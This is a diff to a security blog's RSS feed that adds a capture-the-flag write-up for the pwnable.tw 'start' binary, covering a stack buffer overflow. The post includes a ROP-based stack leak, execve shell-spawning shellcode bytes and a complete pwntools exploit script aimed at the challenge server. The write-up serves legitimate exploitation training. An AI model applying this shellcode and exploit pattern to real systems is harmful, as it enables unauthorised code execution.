@@ -6,7 +6,137 @@
     <description>Recent content in radare2 on Yet, another infosec blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 07 May 2022 09:30:00 +1345</lastBuildDate><atom:link href="https://legiahuyy.github.io/blog/en/tags/radare2/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 09 May 2022 09:30:00 +1345</lastBuildDate><atom:link href="https://legiahuyy.github.io/blog/en/tags/radare2/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pwnable.tw - start [KCSC]</title>
+      <link>https://legiahuyy.github.io/blog/en/posts/kcsc-pwnabletw-start/</link>
+      <pubDate>Mon, 09 May 2022 09:30:00 +1345</pubDate>
+      
+      <guid>https://legiahuyy.github.io/blog/en/posts/kcsc-pwnabletw-start/</guid>
+      <description>This is a write-up for the challenge start at pwnable.tw.
+Footprinting At the very beginning, we shall check the file for any enabled protection bit as well as its characteristics.
+As shown, this is a Linux 32-bit executable with fortuitously no stack guard, PIE, NX and RELRO. Running the program allows us to feed a buffer and thereupon terminates itself, or it does at least in a blind test.
+Solution Let us load the binary into radare2 and have a glance at its disassembly view.</description>
+      <content>&lt;p&gt;This is a write-up for the challenge &lt;code&gt;start&lt;/code&gt; at &lt;a href=&#34;&#34;&gt;pwnable.tw&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_20-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;footprinting&#34;&gt;Footprinting&lt;/h2&gt;
+&lt;p&gt;At the very beginning, we shall check the file for any enabled protection bit as well as its characteristics.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_20-26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As shown, this is a Linux 32-bit executable with fortuitously no stack guard, PIE, NX and RELRO. Running the program allows us to feed a buffer and thereupon terminates itself, or it does at least in a blind test.&lt;/p&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;Let us load the binary into radare2 and have a glance at its disassembly view.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_20-43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;start&lt;/code&gt; consists of solely one function, &lt;code&gt;entry0&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌ 61: entry0 ();
+│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text                                                                                                      
+│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; &amp;quot;\1\xc0@\u0340&amp;quot;
+│           0x08048066      31c0           xor eax, eax
+│           0x08048068      31db           xor ebx, ebx
+│           0x0804806a      31c9           xor ecx, ecx
+│           0x0804806c      31d2           xor edx, edx
+│           0x0804806e      684354463a     push 0x3a465443             ; &#39;CTF:&#39;
+│           0x08048073      6874686520     push 0x20656874             ; &#39;the &#39;
+│           0x08048078      6861727420     push 0x20747261             ; &#39;art &#39;
+│           0x0804807d      6873207374     push 0x74732073             ; &#39;s st&#39;
+│           0x08048082      684c657427     push 0x2774654c             ; &#39;Let&#39;&#39;
+│           0x08048087      89e1           mov ecx, esp
+│           0x08048089      b214           mov dl, 0x14                ; 20
+│           0x0804808b      b301           mov bl, 1
+│           0x0804808d      b004           mov al, 4
+│           0x0804808f      cd80           int 0x80
+│           0x08048091      31db           xor ebx, ebx
+│           0x08048093      b23c           mov dl, 0x3c                ; &#39;&amp;lt;&#39; ; 60
+│           0x08048095      b003           mov al, 3
+│           0x08048097      cd80           int 0x80
+│           0x08048099      83c414         add esp, 0x14
+└           0x0804809c      c3             ret
+[0x08048060]&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you still remember what we discussed in the &lt;a href=&#34;https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/&#34;&gt;previous challenge&lt;/a&gt;, it is not difficult to recognize the syscalls patterns since the code starts pushing the string &lt;em&gt;Let&amp;rsquo;s start the CTF&lt;/em&gt; onto the stack (&lt;code&gt;0x0804806e&lt;/code&gt; - &lt;code&gt;0x08048082&lt;/code&gt;), then sets &lt;code&gt;0x4&lt;/code&gt; into &lt;code&gt;AL&lt;/code&gt;, a derived register from &lt;code&gt;EAX&lt;/code&gt;, and calls &lt;code&gt;int 0x80&lt;/code&gt;. This matched exactly to the following table, take a look.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_22-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Hence, we have the function&amp;rsquo;s pseudo-C as:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
+{
+    SYS_write(STDOUT, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Let&amp;#39;s start the CTF:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;);
+    SYS_read(STDIN, (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;60u&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At &lt;code&gt;0x08048099&lt;/code&gt;, the program only reserves 20 bytes of input on the stack and yet, it allows us to feed a 60-byte stream which leads to a buffer overflow vulnerability in the code. On that account, all we need to do is to find the padding length until we reach and be able to control &lt;code&gt;EIP&lt;/code&gt;, then point the instruction pointer to a ROP chain, leaking the stack address and finally spawn a shell. Simple.&lt;/p&gt;
+&lt;h3 id=&#34;determine-padding-length&#34;&gt;Determine padding length&lt;/h3&gt;
+&lt;p&gt;As we can read from the disassembly view and based on what we have explained above, the padding should be of 20 bytes long; however, you can also use a cyclic pattern to conveniently obtain the said length.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_21-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Either way will result in 20.&lt;/p&gt;
+&lt;h3 id=&#34;leak-stack-address-using-rop&#34;&gt;Leak stack address using ROP&lt;/h3&gt;
+&lt;p&gt;The reason why we have to leak the stack address is that when we inject our shellcode into the program&amp;rsquo;s memory, it will lie somewhere on the stack and we need its exact location, thereby pointing &lt;code&gt;EIP&lt;/code&gt; to that shellcode region.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_07-23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In order to read the stack address, &lt;code&gt;EIP&lt;/code&gt; must point to chunks of code within the binary itself allowing attackers to do so and this is called a ROP (&lt;strong&gt;R&lt;/strong&gt;eturn-&lt;strong&gt;O&lt;/strong&gt;riented &lt;strong&gt;P&lt;/strong&gt;rogramming) chain. Since the size of our binary is rather small, you can just list every single ROP gadget using &lt;a href=&#34;https://github.com/sashs/Ropper&#34;&gt;ropper&lt;/a&gt; and then try to pick the one we need.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_07-40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Pay attention to the gadget at &lt;code&gt;0x08048086&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And this is indeed what we want since it apparently calls &lt;code&gt;SYS_write&lt;/code&gt; (&lt;code&gt;mov al, 4; int 0x80&lt;/code&gt;) with &lt;code&gt;ESP&lt;/code&gt; (stack pointer) as its argument. Now we will tell &lt;code&gt;EIP&lt;/code&gt; to point to this gadget and see what the output is.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./start&amp;#39;&lt;/span&gt;)
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path])
+
+padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pack(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x08048086&lt;/span&gt;)
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; eip
+print(eip)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CTF:&amp;#39;&lt;/span&gt;, payload)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It does print out the stack address and some garbage bytes as the gadget will print until it reaches &lt;code&gt;0x14&lt;/code&gt; characters.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Since the stack address only has 4 bytes (x32 &lt;strong&gt;exclusively&lt;/strong&gt;), let us trim the rest using:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
+stack_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unpack(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
+print(hex(stack_addr))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we have the address we need:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can verify it again in radare2 to see if they have the same pattern:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Seems pretty good so far.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; My addresses are slightly different due to ASLR, disable it and they should be consistent.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;shellcode&#34;&gt;Shellcode&lt;/h3&gt;
+&lt;p&gt;As for NX being disabled, it is feasible to execute shellcode directly on the stack. The shellcode, which you can write your own or download &lt;a href=&#34;https://shell-storm.org/shellcode/&#34;&gt;here&lt;/a&gt;, is as follows:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-pseudocode&#34; data-lang=&#34;pseudocode&#34;&gt;shellcode = b&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the previous step reading the stack address, notice that we make &lt;code&gt;EIP&lt;/code&gt; to point to &lt;code&gt;0x08048086&lt;/code&gt; which reverts the program to its state before &lt;code&gt;SYS_read&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_11-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Thus making it easier for us to continuously send the second payload containing the shellcode. Follow this skeleton syntax:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = padding + &amp;lt;esp+len(padding)&amp;gt; + shellcode
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_11-47.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To even increase our success rate, you should replace the padding with a NOP sled, a chain of &lt;code&gt;0x90&lt;/code&gt; or no-operation bytes, so that &lt;code&gt;EIP&lt;/code&gt; can reach our shellcode without any undefined behaviors might occur during the exploitation.&lt;/p&gt;
+&lt;h2 id=&#34;solvepy&#34;&gt;Solve.py&lt;/h2&gt;
+&lt;p&gt;And we ultimately have our exploiting script:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; distutils.spawn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; spawn
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./start&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# p = process([elf.path])&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chall.pwnable.tw&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
+
+shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+ROPgadget &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pack(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x08048086&lt;/span&gt;)
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ROPgadget
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CTF:&amp;#39;&lt;/span&gt;, payload)
+
+stack_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unpack(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
+
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Stack address: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stack_addr)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+spawn_shell &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pack(stack_addr&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; shellcode
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(spawn_shell)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Remember to use &lt;code&gt;send&lt;/code&gt; and &lt;code&gt;sendafter&lt;/code&gt; but not &lt;code&gt;sendlineafter&lt;/code&gt; as &lt;code&gt;SYS_read&lt;/code&gt; takes &lt;code&gt;\n&lt;/code&gt; then replaces it with &lt;code&gt;\x00&lt;/code&gt; which could interrupt our shellcode. One other note is at &lt;code&gt;0x08048086&lt;/code&gt;, the program will not print the string &amp;ldquo;&lt;em&gt;Let&amp;rsquo;s start the CTF:&lt;/em&gt;&amp;rdquo; so we just need to use &lt;code&gt;send&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_11-59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Pwnable.tw - orw [KCSC]</title>
       <link>https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/</link>
